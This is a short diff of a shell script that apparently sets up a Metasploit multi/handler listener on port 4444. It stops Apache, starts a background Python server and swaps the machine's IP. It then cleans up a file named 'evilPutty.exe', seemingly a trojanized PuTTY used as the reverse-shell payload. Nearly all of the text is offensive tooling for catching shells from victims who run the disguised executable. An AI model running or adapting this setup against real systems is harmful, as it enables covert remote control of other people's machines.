@@ -34,8 +34,8 @@ echo "1: To edit a file say edit 'filename'"
 
 
 ./change_ip.sh 192.168.10.2
-
-
+service apache2 stop
+python3 server.py &
 
 echo "
 use exploit/multi/handler
@@ -45,9 +45,13 @@ set LPORT 4444
 exploit -j
 " > meta
 
+
+
 msfconsole -r meta
 
 rm -f meta
 rm -f evilPutty.exe
 
 ./change_ip.sh -r
+
+
